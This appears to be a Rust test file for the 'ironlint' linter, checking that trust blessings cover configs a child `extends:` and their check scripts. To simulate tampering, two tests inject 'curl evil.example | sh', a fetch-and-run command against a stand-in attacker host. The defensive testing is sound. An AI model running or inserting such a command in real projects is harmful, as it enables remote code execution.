//! Trust must cover the whole `extends:` closure, not just the root config.
//!
//! A blessed child that `extends:` a base in another directory pulls checks from
//! that base (local wins on collision, but base checks still run). If the trust
//! hash folds only the child's own bytes, an attacker can edit the base — or a
//! check script under the base's `.ironlint/scripts/` — to inject a check that runs
//! with no review. These tests lock the hash to the full closure and lock
//! `bless` to validating the closure (not just the local file).

use ironlint_core::trust::{bless_in, ensure_trusted_in};
use std::path::{Path, PathBuf};
use tempfile::tempdir;

fn write(p: &Path, body: &str) {
    if let Some(parent) = p.parent() {
        std::fs::create_dir_all(parent).unwrap();
    }
    std::fs::write(p, body).unwrap();
}

/// Lay out a child config that `extends:` a base in a sibling directory. The
/// base carries its own check plus a script under the base dir's
/// `.ironlint/scripts/`. Returns `(child, base, base_script)`.
fn setup(root: &Path) -> (PathBuf, PathBuf, PathBuf) {
    let base = root.join("base/base.ironlint.yml");
    write(
        &base,
        "checks:\n  base-gate:\n    files: \"*\"\n    run: \".ironlint/scripts/base.sh\"\n",
    );
    let base_script = root.join("base/.ironlint/scripts/base.sh");
    write(&base_script, "#!/bin/sh\nexit 0\n");

    let child = root.join("child/.ironlint.yml");
    write(
        &child,
        "extends: [\"../base/base.ironlint.yml\"]\n\
         checks:\n  child-gate:\n    files: \"*\"\n    run: \"true\"\n",
    );
    (child, base, base_script)
}

#[test]
fn unmutated_extends_closure_is_trusted() {
    let root = tempdir().unwrap();
    let store = tempdir().unwrap();
    let store_path = store.path().join("trust.json");
    let (child, _base, _script) = setup(root.path());

    bless_in(&child, &store_path, "t").unwrap();
    assert!(
        ensure_trusted_in(&child, &store_path).is_ok(),
        "an unmodified blessed closure must stay trusted"
    );
}

#[test]
fn mutating_the_extended_base_revokes_trust() {
    // CRITICAL regression lock. Bless a child, then inject a malicious check into
    // the base it extends. Pre-fix, compute_hash folded only the child's bytes,
    // so the child's hash was unchanged and this stayed trusted — the bypass.
    let root = tempdir().unwrap();
    let store = tempdir().unwrap();
    let store_path = store.path().join("trust.json");
    let (child, base, _script) = setup(root.path());

    bless_in(&child, &store_path, "t").unwrap();
    write(
        &base,
        "checks:\n  base-gate:\n    files: \"*\"\n    run: \".ironlint/scripts/base.sh\"\n\
         \x20\x20evil:\n    files: \"*\"\n    run: \"curl evil.example | sh\"\n",
    );

    assert!(
        ensure_trusted_in(&child, &store_path).is_err(),
        "editing the extended base must revoke the child's trust"
    );
}

#[test]
fn mutating_a_base_gate_script_revokes_trust() {
    // The base's check scripts live under the base dir's .ironlint/scripts/, outside
    // the child dir. Swapping one must revoke trust just like editing the base
    // config itself.
    let root = tempdir().unwrap();
    let store = tempdir().unwrap();
    let store_path = store.path().join("trust.json");
    let (child, _base, script) = setup(root.path());

    bless_in(&child, &store_path, "t").unwrap();
    write(&script, "#!/bin/sh\ncurl evil.example | sh\n");

    assert!(
        ensure_trusted_in(&child, &store_path).is_err(),
        "editing a check script under the base's .ironlint/scripts must revoke trust"
    );
}

#[test]
fn bless_rejects_child_with_missing_extends_target() {
    // MEDIUM regression lock. bless must validate via parse_file_with_extends,
    // so a child pointing at a non-existent base cannot be blessed. Pre-fix,
    // bless validated only the local file (parse_file) and accepted it.
    let root = tempdir().unwrap();
    let store = tempdir().unwrap();
    let store_path = store.path().join("trust.json");
    let child = root.path().join("child/.ironlint.yml");
    write(
        &child,
        "extends: [\"../base/missing.ironlint.yml\"]\n\
         checks:\n  child-gate:\n    files: \"*\"\n    run: \"true\"\n",
    );

    assert!(
        bless_in(&child, &store_path, "t").is_err(),
        "blessing a config whose extends target is missing must fail"
    );
}
